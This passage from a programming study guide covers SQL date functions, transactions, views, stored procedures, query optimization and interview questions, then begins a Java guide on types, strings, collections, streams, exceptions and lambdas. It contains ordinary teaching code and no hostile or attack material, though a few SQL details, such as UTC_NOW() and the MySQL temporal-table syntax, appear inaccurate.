REGEXP_REPLACE(text, pattern, replacement)
REGEXP_SUBSTR(text, pattern)
```

---

## 12. Date and Time Functions

```sql
-- Current values
NOW()                -- Current datetime: '2024-01-15 14:30:00'
CURDATE()            -- Current date: '2024-01-15'
CURTIME()            -- Current time: '14:30:00'
UTC_NOW()

-- Extraction
YEAR('2024-01-15')      -- 2024
MONTH('2024-01-15')     -- 1
DAY('2024-01-15')       -- 15
HOUR('14:30:00')        -- 14
MINUTE('14:30:00')      -- 30
SECOND('14:30:00')      -- 0
DAYOFWEEK('2024-01-15') -- 2 (1=Sunday, 7=Saturday)
DAYNAME('2024-01-15')   -- 'Monday'
MONTHNAME('2024-01-15') -- 'January'
WEEK('2024-01-15')      -- 3 (week number)
QUARTER('2024-01-15')   -- 1

-- Extract (standard SQL)
EXTRACT(YEAR FROM date_column)
EXTRACT(MONTH FROM date_column)
EXTRACT(DAY FROM date_column)

-- Arithmetic
DATE_ADD('2024-01-15', INTERVAL 30 DAY)       -- '2024-02-14'
DATE_SUB('2024-01-15', INTERVAL 1 MONTH)      -- '2023-12-15'
ADDDATE('2024-01-15', 30)                     -- '2024-02-14'
DATEDIFF('2024-02-14', '2024-01-15')          -- 30 (days)
TIMESTAMPDIFF(MONTH, start_date, end_date)
TIMEDIFF('14:30:00', '10:15:00')              -- '04:15:00'

-- Formatting
DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%s')       -- '2024-01-15 14:30:00'
DATE_FORMAT(NOW(), '%M %d, %Y')               -- 'January 15, 2024'
DATE_FORMAT(NOW(), '%W')                      -- 'Monday'
STR_TO_DATE('01/15/2024', '%m/%d/%Y')         -- '2024-01-15' (parse)
UNIX_TIMESTAMP('2024-01-15')                  -- Unix timestamp
FROM_UNIXTIME(1705276800)                     -- Convert from Unix

-- Common date queries
WHERE created_at >= CURDATE()                                    -- Today
WHERE created_at >= DATE_SUB(CURDATE(), INTERVAL 7 DAY)         -- Last 7 days
WHERE YEAR(created_at) = 2024 AND MONTH(created_at) = 1        -- Jan 2024
WHERE created_at BETWEEN '2024-01-01' AND '2024-01-31 23:59:59' -- Date range
```

---

## 13. Transactions

```sql
-- Start transaction
START TRANSACTION;
-- or
BEGIN;
BEGIN TRANSACTION;

-- Operations
UPDATE accounts SET balance = balance - 500 WHERE id = 1;
UPDATE accounts SET balance = balance + 500 WHERE id = 2;

-- Commit (make permanent)
COMMIT;

-- Rollback (undo all changes)
ROLLBACK;

-- Savepoints (partial rollback)
SAVEPOINT before_transfer;
UPDATE accounts SET balance = balance - 500 WHERE id = 1;
SAVEPOINT after_debit;
UPDATE accounts SET balance = balance + 500 WHERE id = 2;

ROLLBACK TO SAVEPOINT after_debit;  -- Undo only credit, keep debit
ROLLBACK TO SAVEPOINT before_transfer;  -- Undo everything

RELEASE SAVEPOINT after_debit;  -- Remove savepoint

-- Isolation levels
SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;  -- Dirty reads
SET TRANSACTION ISOLATION LEVEL READ COMMITTED;    -- Default in PostgreSQL
SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;   -- Default in MySQL
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;      -- Strictest

-- Auto-commit
SET autocommit = 0;   -- Disable (MySQL)
SET autocommit = 1;   -- Enable (default)
```

---

## 14. Views

```sql
-- Create view
CREATE VIEW active_user_summary AS
SELECT 
    u.id,
    u.username,
    u.email,
    COUNT(o.id) AS order_count,
    COALESCE(SUM(o.amount), 0) AS total_spent
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE u.is_active = TRUE
GROUP BY u.id, u.username, u.email;

-- Use view like a table
SELECT * FROM active_user_summary WHERE total_spent > 1000;

-- Update view (if simple enough)
UPDATE active_user_summary SET email = 'new@email.com' WHERE id = 1;

-- Replace view
CREATE OR REPLACE VIEW active_user_summary AS ...;

-- Drop view
DROP VIEW IF EXISTS active_user_summary;

-- Materialized view (PostgreSQL — stored on disk)
CREATE MATERIALIZED VIEW monthly_revenue AS
SELECT YEAR(date) AS year, MONTH(date) AS month, SUM(amount) AS revenue
FROM orders GROUP BY 1, 2;

REFRESH MATERIALIZED VIEW monthly_revenue;
```

---

## 15. Stored Procedures and Functions

```sql
-- Stored procedure (MySQL)
DELIMITER //
CREATE PROCEDURE GetUserOrders(IN user_id INT, IN min_amount DECIMAL(10,2))
BEGIN
    DECLARE done INT DEFAULT 0;
    
    SELECT o.id, o.amount, o.date
    FROM orders o
    WHERE o.user_id = user_id
      AND o.amount >= min_amount
    ORDER BY o.date DESC;
END //
DELIMITER ;

-- Call procedure
CALL GetUserOrders(1, 100.00);

-- Function (returns a value)
DELIMITER //
CREATE FUNCTION CalculateTax(amount DECIMAL(10,2), rate DECIMAL(5,4))
RETURNS DECIMAL(10,2)
DETERMINISTIC
BEGIN
    RETURN ROUND(amount * rate, 2);
END //
DELIMITER ;

-- Use function
SELECT amount, CalculateTax(amount, 0.0875) AS tax FROM orders;

-- Stored procedure with OUT parameters
DELIMITER //
CREATE PROCEDURE GetStats(IN dept VARCHAR(50), OUT avg_salary DECIMAL(10,2), OUT count INT)
BEGIN
    SELECT AVG(salary), COUNT(*) INTO avg_salary, count
    FROM employees
    WHERE department = dept;
END //
DELIMITER ;

CALL GetStats('Engineering', @avg, @count);
SELECT @avg, @count;
```

---

## 16. Performance and Query Optimization

```sql
-- EXPLAIN shows query execution plan
EXPLAIN SELECT * FROM users WHERE email = 'alice@example.com';
EXPLAIN ANALYZE SELECT ...;  -- PostgreSQL

-- Key columns in EXPLAIN output
-- type: ALL (full scan, bad) → range → ref → eq_ref → const (fast)
-- possible_keys: indexes that COULD be used
-- key: index actually used
-- rows: estimated rows examined
-- Extra: "Using filesort", "Using index", etc.

-- Index best practices
-- 1. Index columns used in WHERE, JOIN ON, ORDER BY
-- 2. Composite indexes: put highest-selectivity columns first
-- 3. Avoid indexing low-cardinality columns (boolean, status)
-- 4. Too many indexes slow down writes

-- Common performance issues
-- ❌ SELECT * (retrieve only needed columns)
SELECT id, email FROM users;  -- Not SELECT *

-- ❌ Functions on indexed columns disable index
SELECT * FROM users WHERE YEAR(created_at) = 2024;  -- Bad
SELECT * FROM users WHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'; -- Good

-- ❌ Leading wildcard disables index
WHERE name LIKE '%alice%';    -- Full scan
WHERE name LIKE 'alice%';     -- Uses index

-- ❌ NOT IN with NULLs
WHERE id NOT IN (SELECT user_id FROM banned WHERE user_id IS NOT NULL);

-- ✅ Use EXISTS instead
WHERE NOT EXISTS (SELECT 1 FROM banned WHERE user_id = users.id);

-- ✅ Use LIMIT for large results
-- ✅ Pagination with keyset instead of OFFSET for large tables
SELECT * FROM users WHERE id > last_seen_id ORDER BY id LIMIT 20;

-- Query hints (MySQL)
SELECT /*+ USE_INDEX(users idx_email) */ * FROM users WHERE email = '...';
SELECT * FROM users FORCE INDEX (idx_email) WHERE email = '...';
```

---

## 17. Advanced SQL Concepts

```sql
-- PIVOT (rotate rows to columns — MySQL workaround)
SELECT 
    user_id,
    SUM(CASE WHEN product = 'A' THEN amount ELSE 0 END) AS product_a,
    SUM(CASE WHEN product = 'B' THEN amount ELSE 0 END) AS product_b,
    SUM(CASE WHEN product = 'C' THEN amount ELSE 0 END) AS product_c
FROM orders
GROUP BY user_id;

-- UNPIVOT (columns to rows)
SELECT user_id, 'Q1' AS quarter, q1_sales AS sales FROM sales
UNION ALL
SELECT user_id, 'Q2', q2_sales FROM sales
UNION ALL
SELECT user_id, 'Q3', q3_sales FROM sales;

-- Handling NULLs
COALESCE(val1, val2, val3)    -- First non-NULL value
NULLIF(a, b)                  -- NULL if a=b, else a
IFNULL(expr, default)         -- MySQL: if NULL, use default
NVL(expr, default)            -- Oracle equivalent
IS NULL, IS NOT NULL          -- Never use = NULL

-- JSON operations (MySQL 5.7+)
SELECT data->>'$.name' FROM users;  -- Extract JSON field
SELECT JSON_EXTRACT(data, '$.address.city');
UPDATE users SET data = JSON_SET(data, '$.phone', '555-1234');
WHERE JSON_CONTAINS(data, '"admin"', '$.roles');

-- Temporal tables / history tracking (MySQL 8.0.2+)
CREATE TABLE products (
    id INT AUTO_INCREMENT,
    name VARCHAR(100),
    price DECIMAL(10,2),
    valid_from DATETIME(6) GENERATED ALWAYS AS ROW START,
    valid_to DATETIME(6) GENERATED ALWAYS AS ROW END,
    PERIOD FOR SYSTEM_TIME (valid_from, valid_to),
    PRIMARY KEY (id)
) WITH SYSTEM VERSIONING;

SELECT * FROM products FOR SYSTEM_TIME AS OF '2024-01-01';
SELECT * FROM products FOR SYSTEM_TIME ALL;
```

---

## 18. SQL Interview Questions

**Q: What is the difference between `WHERE` and `HAVING`?**
A: `WHERE` filters individual rows **before** grouping. `HAVING` filters **groups** after `GROUP BY`. You can only use aggregate functions in `HAVING`.

**Q: What is a primary key vs a foreign key?**
A: Primary key uniquely identifies each row and cannot be NULL. Foreign key references a primary key in another table to enforce referential integrity.

**Q: What is the difference between `INNER JOIN` and `LEFT JOIN`?**
A: `INNER JOIN` returns only rows that have matching records in **both** tables. `LEFT JOIN` returns all rows from the left table plus matching rows from the right (NULL if no match).

**Q: What is the difference between `DELETE`, `TRUNCATE`, and `DROP`?**
A: `DELETE` removes specific rows (can be rolled back, slow). `TRUNCATE` removes all rows but keeps structure (can't be rolled back in MySQL, resets auto-increment). `DROP` removes the entire table including structure.

**Q: What is a subquery? When would you use a CTE instead?**
A: A subquery is a query nested inside another. CTEs (WITH clauses) are more readable, reusable within the same query, and essential for recursive queries.

**Q: What is a window function?**
A: A function that calculates a value over a "window" of related rows without collapsing the result set. Examples: `ROW_NUMBER()`, `RANK()`, `SUM() OVER()`, `LAG()`.

**Q: Explain normalization and the first three normal forms.**
A: 1NF: Each column has atomic values (no arrays). 2NF: No partial dependency (every non-key column depends on the whole primary key). 3NF: No transitive dependency (non-key columns don't depend on other non-key columns).

---

*End of SQL Study Guide*


---

# Java — Complete Study Guide

---

## 1. What Is Java?

Java is a **statically typed, object-oriented, compiled-then-interpreted** programming language. Code compiles to **bytecode** which runs on the **Java Virtual Machine (JVM)** — making it platform-independent ("Write Once, Run Anywhere"). Created by James Gosling at Sun Microsystems in 1995.

Key traits: strongly typed, garbage-collected, multithreaded, extensive standard library, massive enterprise ecosystem.

---

## 2. Java Basics

```java
// Every Java program needs a class matching the filename
// File: HelloWorld.java
public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, World!");
        System.out.print("No newline");
        System.out.printf("Name: %s, Age: %d%n", "Alice", 25);
    }
}
```

```bash
# Compile
javac HelloWorld.java   # Produces HelloWorld.class

# Run
java HelloWorld
```

---

## 3. Variables and Primitive Types

Java has **8 primitive types** (lowercase) and **reference types** (classes, starts uppercase).

```java
// Primitive types
byte   b = 127;                // 8-bit  signed: -128 to 127
short  s = 32767;              // 16-bit signed
int    i = 2147483647;         // 32-bit signed (most common)
long   l = 9223372036854775807L; // 64-bit signed (note L suffix)
float  f = 3.14f;              // 32-bit float (note f suffix)
double d = 3.141592653589793;  // 64-bit float (default decimal type)
char   c = 'A';                // 16-bit Unicode character
boolean flag = true;           // true or false

// Literals
int hex = 0xFF;                // 255
int bin = 0b10101010;          // 170
int big = 1_000_000;           // Underscores for readability
long lng = 123_456_789L;

// Reference types (null is default)
String  str = "Hello";
String  empty = null;
int[]   arr = new int[10];
int[]   arr2 = {1, 2, 3};

// Type casting
int x = (int) 3.99;           // Explicit: 3 (truncates)
double y = 5;                  // Implicit widening: 5.0
long big2 = (long) Integer.MAX_VALUE + 1;  // Explicit to avoid overflow

// Wrapper classes (primitives as objects)
Integer.MAX_VALUE              // 2147483647
Integer.MIN_VALUE              // -2147483648
Integer.parseInt("42")         // int from String
Integer.toString(42)           // String from int
Integer.toBinaryString(255)    // "11111111"
Integer.toHexString(255)       // "ff"
Double.parseDouble("3.14")
Boolean.parseBoolean("true")

// Autoboxing/unboxing
Integer boxed = 42;            // int → Integer (autoboxing)
int unboxed = boxed;           // Integer → int (unboxing)
List<Integer> list = new ArrayList<>();
list.add(42);                  // Autoboxed
int val = list.get(0);        // Unboxed
```

---

## 4. Strings

```java
// Strings are immutable objects in Java
String s = "Hello, World!";
String s2 = new String("Hello");   // Creates new object (avoid)

// Common methods
s.length()                    // 13
s.charAt(0)                   // 'H'
s.indexOf("World")            // 7
s.lastIndexOf("o")            // 8
s.substring(7)                // "World!"
s.substring(7, 12)            // "World"
s.toLowerCase()               // "hello, world!"
s.toUpperCase()               // "HELLO, WORLD!"
s.trim()                      // Remove leading/trailing whitespace
s.strip()                     // Unicode-aware trim (Java 11+)
s.replace("World", "Java")    // "Hello, Java!"
s.replaceAll("[aeiou]", "*")  // Regex replace
s.contains("World")           // true
s.startsWith("Hello")         // true
s.endsWith("!")               // true
s.equals("Hello, World!")     // true (content comparison)
s.equalsIgnoreCase("hello")   // false
s.compareTo("Hello")          // Lexicographic comparison
s.isEmpty()                   // false
s.isBlank()                   // false (Java 11+)
s.split(", ")                 // ["Hello", "World!"]
s.split(",", 2)               // Limit splits to 2 parts
String.join(", ", "a", "b")   // "a, b"
String.join("-", list)
s.toCharArray()               // char[]
s.chars()                     // IntStream of char values
s.formatted("World")          // Java 15+ (like String.format)

// String comparison — NEVER use == for content!
String a = "hello";
String b = "hello";
a == b;        // May be true (string pool) — don't rely on this
a.equals(b);   // true — always use this

// String.format
String msg = String.format("Name: %s, Age: %d, Score: %.2f", name, age, score);
// Format specifiers: %s String, %d int, %f float, %b boolean, %c char
// Width: %10s (right-align), %-10s (left-align)
// Precision: %.2f (2 decimal places)
// %n = newline (platform-independent)

// StringBuilder (mutable — use in loops)
StringBuilder sb = new StringBuilder();
sb.append("Hello");
sb.append(", ");
sb.append("World");
sb.insert(5, "!");
sb.delete(5, 6);
sb.replace(0, 5, "Greetings");
sb.reverse();
sb.toString();              // Convert to String
sb.length();
sb.charAt(0);

// Always prefer StringBuilder over concatenation in loops:
// Bad:  String result = ""; for(...) result += item;
// Good: StringBuilder sb = new StringBuilder(); for(...) sb.append(item);

// Text blocks (Java 15+)
String json = """
        {
            "name": "Alice",
            "age": 25
        }
        """;
```

---

## 5. Arrays

```java
// Declaration and initialization
int[] numbers = new int[5];              // [0, 0, 0, 0, 0]
String[] names = new String[3];          // [null, null, null]
int[] primes = {2, 3, 5, 7, 11};        // Inline initialization
int[] more = new int[]{1, 2, 3};        // Explicit

// Access
primes[0]         // 2
primes[primes.length - 1]  // 11
// primes[5]      // ArrayIndexOutOfBoundsException

// 2D arrays
int[][] matrix = new int[3][4];
int[][] grid = {{1,2,3},{4,5,6},{7,8,9}};
grid[1][2]        // 6
grid.length       // 3 (rows)
grid[0].length    // 3 (cols)

// Jagged arrays
int[][] jagged = new int[3][];
jagged[0] = new int[2];
jagged[1] = new int[5];

// java.util.Arrays
import java.util.Arrays;
Arrays.sort(numbers);                    // Sort in place (ascending)
Arrays.sort(names, String::compareToIgnoreCase);
Arrays.binarySearch(numbers, 5);        // Only on sorted arrays
Arrays.fill(numbers, 0);               // Fill with value
Arrays.copyOf(numbers, 10);            // Copy, extend/truncate
Arrays.copyOfRange(numbers, 1, 4);     // Subarray
Arrays.equals(arr1, arr2);             // Element-wise comparison
Arrays.deepEquals(matrix1, matrix2);   // For nested arrays
Arrays.toString(numbers);             // "[2, 3, 5, 7, 11]"
Arrays.deepToString(matrix);          // For nested arrays
int[] copy = numbers.clone();         // Shallow copy

// Enhanced for loop
for (int n : primes) {
    System.out.println(n);
}

// Convert array to List
List<String> list = Arrays.asList("a", "b", "c");  // Fixed-size!
List<String> list2 = new ArrayList<>(Arrays.asList("a", "b"));  // Mutable

// Convert List to array
String[] arr = list.toArray(new String[0]);
```

---

## 6. Control Flow

```java
// if / else if / else
int score = 85;
if (score >= 90) {
    System.out.println("A");
} else if (score >= 80) {
    System.out.println("B");
} else {
    System.out.println("F");
}

// Ternary
String grade = score >= 60 ? "Pass" : "Fail";

// switch (classic)
switch (day) {
    case "Monday":
    case "Tuesday":
        System.out.println("Weekday");
        break;
    case "Saturday":
    case "Sunday":
        System.out.println("Weekend");
        break;
    default:
        System.out.println("Unknown");
}

// switch expression (Java 14+)
String result = switch (day) {
    case "Monday", "Tuesday", "Wednesday", "Thursday", "Friday" -> "Weekday";
    case "Saturday", "Sunday" -> "Weekend";
    default -> throw new IllegalArgumentException("Unknown day: " + day);
};

// switch with yield (Java 14+)
int numLetters = switch (day) {
    case "Monday", "Friday", "Sunday" -> 6;
    case "Tuesday" -> 7;
    case "Wednesday" -> 9;
    case "Thursday", "Saturday" -> 8;
    default -> {
        int len = day.length();
        yield len;  // yield returns a value from a block
    }
};

// for loop
for (int i = 0; i < 10; i++) {
    if (i == 5) continue;
    if (i == 8) break;
    System.out.println(i);
}

// while
int n = 0;
while (n < 10) n++;

// do-while
do {
    n--;
} while (n > 0);

// Enhanced for (for-each)
int[] arr = {1, 2, 3, 4, 5};
for (int num : arr) {
    System.out.println(num);
}

// Labeled break/continue
outer:
for (int i = 0; i < 3; i++) {
    for (int j = 0; j < 3; j++) {
        if (j == 1) continue outer;
        if (i == 2) break outer;
    }
}
```

---

## 7. Methods

```java
public class MathUtils {
    // Instance method
    public int add(int a, int b) {
        return a + b;
    }

    // Static method (no object needed)
    public static double circleArea(double radius) {
        return Math.PI * radius * radius;
    }

    // Overloading (same name, different parameters)
    public int max(int a, int b) {
        return a > b ? a : b;
    }
    public double max(double a, double b) {
        return a > b ? a : b;
    }
    public int max(int a, int b, int c) {
        return max(max(a, b), c);
    }

    // Varargs (variable arguments)
    public static int sum(int... numbers) {
        int total = 0;
        for (int n : numbers) total += n;
        return total;
    }
    // sum(1, 2, 3);  sum(1, 2, 3, 4, 5);

    // Recursion
    public static long factorial(int n) {
        if (n <= 1) return 1;
        return n * factorial(n - 1);
    }
}
```

---

## 8. Object-Oriented Programming

```java
// Base class
public class Animal {
    // Fields
    private String name;
    private int age;
    protected String sound;
    public static int count = 0;    // Class variable

    // Constructor
    public Animal(String name, int age, String sound) {
        this.name = name;
        this.age = age;
        this.sound = sound;
        count++;
    }

    // Copy constructor
    public Animal(Animal other) {
        this(other.name, other.age, other.sound);
    }

    // Getters and Setters
    public String getName() { return name; }
    public void setName(String name) {
        if (name == null || name.isEmpty())
            throw new IllegalArgumentException("Name cannot be empty");
        this.name = name;
    }
    public int getAge() { return age; }
    public void setAge(int age) { this.age = age; }

    // Instance method
    public String speak() {
        return name + " says " + sound + "!";
    }

    // Static method
    public static int getCount() { return count; }

    // Overriding Object methods
    @Override
    public String toString() {
        return "Animal{name='" + name + "', age=" + age + "}";
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj) return true;
        if (!(obj instanceof Animal)) return false;
        Animal other = (Animal) obj;
        return name.equals(other.name) && age == other.age;
    }

    @Override
    public int hashCode() {
        return Objects.hash(name, age);
    }
}

// Subclass (inheritance)
public class Dog extends Animal {
    private String breed;

    public Dog(String name, int age, String breed) {
        super(name, age, "Woof");   // Call parent constructor
        this.breed = breed;
    }

    public String getBreed() { return breed; }

    @Override
    public String speak() {
        return super.speak() + " *wags tail*";   // Call parent method
    }

    public void fetch(String item) {
        System.out.println(getName() + " fetches the " + item + "!");
    }
}

// Abstract class
public abstract class Shape {
    protected String color;

    public Shape(String color) { this.color = color; }

    // Abstract method — must be implemented by subclasses
    public abstract double area();
    public abstract double perimeter();

    // Concrete method
    public void describe() {
        System.out.printf("A %s %s with area %.2f%n",
            color, getClass().getSimpleName(), area());
    }
}

public class Circle extends Shape {
    private double radius;

    public Circle(String color, double radius) {
        super(color);
        this.radius = radius;
    }

    @Override public double area() { return Math.PI * radius * radius; }
    @Override public double perimeter() { return 2 * Math.PI * radius; }
}

// Interfaces
public interface Flyable {
    double MAX_ALTITUDE = 10000; // Implicitly public static final

    void fly();                  // Implicitly public abstract

    default void land() {        // Default implementation
        System.out.println("Landing...");
    }

    static Flyable create() {    // Static factory method
        return () -> System.out.println("Flying!");
    }
}

public interface Swimmable {
    void swim();
}

// Implementing multiple interfaces
public class Duck extends Animal implements Flyable, Swimmable {
    public Duck(String name) { super(name, 1, "Quack"); }

    @Override public void fly()  { System.out.println(getName() + " is flying!"); }
    @Override public void swim() { System.out.println(getName() + " is swimming!"); }
}

// Records (Java 16+ — immutable data carriers)
public record Point(int x, int y) {
    // Auto-generates: constructor, getters (x(), y()), toString, equals, hashCode
    
    // Compact constructor (validation)
    public Point {
        if (x < 0 || y < 0) throw new IllegalArgumentException("Negative coords");
    }

    // Custom method
    public double distanceTo(Point other) {
        return Math.hypot(other.x - this.x, other.y - this.y);
    }
}
```

---

## 9. Generics

```java
// Generic class
public class Box<T> {
    private T value;

    public Box(T value) { this.value = value; }
    public T getValue() { return value; }

    @Override
    public String toString() {
        return "Box<" + value.getClass().getSimpleName() + ">(" + value + ")";
    }
}

Box<Integer> intBox = new Box<>(42);
Box<String>  strBox = new Box<>("Hello");

// Generic method
public static <T extends Comparable<T>> T max(T a, T b) {
    return a.compareTo(b) >= 0 ? a : b;
}

// Wildcards
public static double sumList(List<? extends Number> list) {
    return list.stream().mapToDouble(Number::doubleValue).sum();
}
// <? extends T>  — can read, not write (covariant)
// <? super T>    — can write, not read as T (contravariant)
// <?>            — unknown type (read as Object only)

// Bounded type parameters
public <T extends Comparable<T> & Serializable> void store(T item) { ... }
```

---

## 10. Collections Framework

```java
import java.util.*;
import java.util.stream.*;

// List (ordered, allows duplicates)
List<String> list = new ArrayList<>();
list.add("apple");
list.add("banana");
list.add(0, "cherry");     // Insert at index
list.set(1, "mango");      // Replace
list.get(0);               // "cherry"
list.remove(0);            // By index
list.remove("banana");     // By value
list.size();
list.contains("mango");
list.indexOf("mango");
list.isEmpty();
list.clear();
list.sort(Comparator.naturalOrder());
list.sort(Comparator.reverseOrder());
list.sort(Comparator.comparing(String::length));
Collections.sort(list);
Collections.shuffle(list);
Collections.reverse(list);
Collections.min(list);
Collections.max(list);
list.subList(1, 3);        // View (not a copy!)
list.toArray(new String[0]);
List.of("a", "b", "c");   // Immutable list (Java 9+)
List.copyOf(other);        // Immutable copy

// LinkedList (doubly linked — efficient head/tail ops)
LinkedList<String> queue = new LinkedList<>();
queue.addFirst("front");
queue.addLast("back");
queue.removeFirst();
queue.removeLast();
queue.peek();              // View first without removing

// Stack
Deque<Integer> stack = new ArrayDeque<>();
stack.push(1);
stack.push(2);
stack.pop();               // 2
stack.peek();              // 1 (without removing)

// Queue
Queue<String> queue2 = new LinkedList<>();
queue2.offer("first");
queue2.offer("second");
queue2.poll();             // "first" (removes)
queue2.peek();             // "second" (doesn't remove)

// PriorityQueue (min-heap by default)
PriorityQueue<Integer> pq = new PriorityQueue<>();
PriorityQueue<Integer> maxPQ = new PriorityQueue<>(Comparator.reverseOrder());
pq.offer(5); pq.offer(1); pq.offer(3);
pq.poll();   // 1 (smallest)

// Set (no duplicates)
Set<String> set = new HashSet<>();       // O(1) ops, unordered
Set<String> ordered = new TreeSet<>();   // Sorted, O(log n)
Set<String> linked = new LinkedHashSet<>(); // Insertion order

set.add("apple");
set.contains("apple");    // true
set.remove("apple");
set.size();
Set.of("a", "b", "c");   // Immutable

// Set operations
Set<Integer> a = new HashSet<>(Arrays.asList(1,2,3,4));
Set<Integer> b = new HashSet<>(Arrays.asList(3,4,5,6));
Set<Integer> union = new HashSet<>(a); union.addAll(b);         // {1,2,3,4,5,6}
Set<Integer> intersect = new HashSet<>(a); intersect.retainAll(b); // {3,4}
Set<Integer> diff = new HashSet<>(a); diff.removeAll(b);        // {1,2}

// Map (key-value pairs, no duplicate keys)
Map<String, Integer> map = new HashMap<>();  // O(1) avg, unordered
Map<String, Integer> sorted = new TreeMap<>();  // Sorted by key
Map<String, Integer> linked = new LinkedHashMap<>(); // Insertion order

map.put("one", 1);
map.put("two", 2);
map.get("one");               // 1
map.getOrDefault("three", 0); // 0
map.containsKey("one");       // true
map.containsValue(1);         // true
map.remove("one");
map.size();
map.isEmpty();
map.putIfAbsent("two", 99);   // Only put if key absent
map.computeIfAbsent("list", k -> new ArrayList<>());
map.merge("count", 1, Integer::sum);  // Add if absent, merge if present

// Iteration
for (Map.Entry<String, Integer> entry : map.entrySet()) {
    System.out.println(entry.getKey() + " = " + entry.getValue());
}
map.forEach((k, v) -> System.out.println(k + " = " + v));
map.keySet();
map.values();
map.entrySet();
Map.of("a", 1, "b", 2);   // Immutable (Java 9+, max 10 entries)
Map.copyOf(other);

// Utility methods
Collections.unmodifiableList(list);
Collections.synchronizedList(list);
Collections.frequency(list, "apple");
Collections.nCopies(5, "x");    // ["x","x","x","x","x"]
Collections.disjoint(set1, set2); // true if no common elements
```

---

## 11. Streams API

```java
import java.util.stream.*;

List<Integer> numbers = List.of(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);

// Creating streams
numbers.stream()                    // From collection
Arrays.stream(arr)                  // From array
Stream.of(1, 2, 3)                  // From values
Stream.empty()
IntStream.range(0, 10)             // 0 to 9
IntStream.rangeClosed(1, 10)       // 1 to 10
Stream.generate(() -> "hello").limit(5)
Stream.iterate(0, n -> n + 2).limit(10) // 0,2,4,6,8,10,12,14,16,18
Stream.iterate(0, n -> n < 100, n -> n + 2)  // With predicate (Java 9)

// Intermediate operations (lazy — return a new Stream)
.filter(n -> n % 2 == 0)           // Keep only evens
.map(n -> n * 2)                   // Transform each
.mapToInt(String::length)          // To primitive stream
.mapToDouble(n -> n * 1.0)
.flatMap(list -> list.stream())    // Flatten nested streams
.distinct()                        // Remove duplicates
.sorted()                          // Sort (natural order)
.sorted(Comparator.reverseOrder()) // Custom sort
.limit(5)                          // Take first 5
.skip(2)                           // Skip first 2
.peek(n -> System.out.println(n))  // Side effect for debugging
.takeWhile(n -> n < 5)            // Java 9
.dropWhile(n -> n < 5)            // Java 9

// Terminal operations (eager — trigger the pipeline)
.collect(Collectors.toList())
.collect(Collectors.toSet())
.collect(Collectors.toUnmodifiableList())
.collect(Collectors.joining(", ", "[", "]"))
.collect(Collectors.groupingBy(String::length))
.collect(Collectors.partitioningBy(n -> n % 2 == 0))
.collect(Collectors.counting())
.collect(Collectors.summingInt(Integer::intValue))
.collect(Collectors.averagingDouble(n -> n))
.collect(Collectors.toMap(k -> k, v -> v.length()))

.forEach(System.out::println)
.count()
.findFirst()          // Returns Optional
.findAny()            // May be faster in parallel
.anyMatch(n -> n > 5)
.allMatch(n -> n > 0)
.noneMatch(n -> n < 0)
.min(Comparator.naturalOrder())   // Returns Optional
.max(Comparator.naturalOrder())   // Returns Optional
.sum()                // IntStream, LongStream, DoubleStream only
.average()            // Returns OptionalDouble
.summaryStatistics()  // Count, sum, min, max, avg
.reduce(0, Integer::sum)
.reduce((a, b) -> a + b)    // Returns Optional
.toArray()

// Practical examples
List<String> names = List.of("Alice", "Bob", "Charlie", "David", "Eve");

// Filter, sort, collect
List<String> result = names.stream()
    .filter(n -> n.length() > 3)
    .sorted()
    .collect(Collectors.toList());

// Map to uppercase
List<String> upper = names.stream()
    .map(String::toUpperCase)
    .collect(Collectors.toList());

// Count by length
Map<Integer, Long> byLength = names.stream()
    .collect(Collectors.groupingBy(String::length, Collectors.counting()));

// Find longest name
Optional<String> longest = names.stream()
    .max(Comparator.comparing(String::length));

longest.ifPresent(System.out::println);
longest.orElse("None");
longest.orElseGet(() -> "None");
longest.orElseThrow(() -> new RuntimeException("No names"));

// Parallel streams
long count = numbers.parallelStream()
    .filter(n -> isPrime(n))
    .count();
```

---

## 12. Exception Handling

```java
// Checked exceptions: must be declared or handled
// Unchecked exceptions: extend RuntimeException, optional handling

// try-catch-finally
try {
    int result = Integer.parseInt("not a number");
    FileReader fr = new FileReader("nonexistent.txt");
} catch (NumberFormatException e) {
    System.err.println("Number format error: " + e.getMessage());
} catch (FileNotFoundException e) {
    System.err.println("File not found: " + e.getMessage());
} catch (IOException | IllegalArgumentException e) {
    // Multi-catch (Java 7+)
    e.printStackTrace();
} finally {
    System.out.println("Always executes");
}

// Try-with-resources (auto-closes)
try (FileReader fr = new FileReader("file.txt");
     BufferedReader br = new BufferedReader(fr)) {
    String line;
    while ((line = br.readLine()) != null) {
        System.out.println(line);
    }
} catch (IOException e) {
    e.printStackTrace();
}

// Custom exceptions
public class AppException extends RuntimeException {
    private final String code;

    public AppException(String message, String code) {
        super(message);
        this.code = code;
    }

    public AppException(String message, String code, Throwable cause) {
        super(message, cause);
        this.code = code;
    }

    public String getCode() { return code; }
}

// Throw exceptions
void validateAge(int age) {
    if (age < 0) throw new IllegalArgumentException("Age cannot be negative");
    if (age > 150) throw new IllegalArgumentException("Age unrealistically large");
}

// Exception hierarchy
// Throwable
//   Error (don't catch: OutOfMemoryError, StackOverflowError)
//   Exception
//     IOException (checked)
//     SQLException (checked)
//     RuntimeException (unchecked)
//       NullPointerException
//       ArrayIndexOutOfBoundsException
//       IllegalArgumentException
//       IllegalStateException
//       UnsupportedOperationException
//       ArithmeticException
//       ClassCastException
//       NumberFormatException
//       ConcurrentModificationException
```

---

## 13. Functional Interfaces and Lambdas

```java
import java.util.function.*;

// Functional interfaces (one abstract method)
Predicate<String> isEmpty = s -> s.isEmpty();
Predicate<Integer> isEven = n -> n % 2 == 0;
isEven.test(4);              // true
isEven.negate();             // Opposite predicate
isEven.and(n -> n > 0);     // Both must be true
isEven.or(n -> n < 0);      // Either must be true

Function<String, Integer> length = s -> s.length();
Function<String, String> trim = String::trim;
length.apply("hello");       // 5
length.andThen(n -> n * 2);  // Compose
trim.compose(String::toLowerCase);  // Apply first, then trim

Consumer<String> print = System.out::println;
BiConsumer<String, Integer> printPair = (s, n) -> System.out.println(s + ": " + n);
print.accept("Hello");
print.andThen(s -> System.out.println("Done"));

Supplier<List<String>> listFactory = ArrayList::new;
